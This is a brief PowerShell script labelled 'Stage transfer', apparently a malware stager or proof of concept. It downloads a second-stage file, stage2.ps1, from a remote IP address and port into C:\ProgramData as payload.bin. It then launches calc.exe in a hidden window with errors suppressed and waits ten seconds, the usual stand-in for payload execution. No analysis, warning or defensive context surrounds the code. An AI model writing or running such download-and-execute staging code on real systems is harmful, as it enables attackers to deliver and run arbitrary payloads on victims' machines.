<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$Stage1Url = "http://198.51.100.47:8080/stage2.ps1",
    [string]$DownloadPath = 'C:\ProgramData\payload.bin'
)
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $DownloadPath)
Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
Start-Sleep -Seconds 10
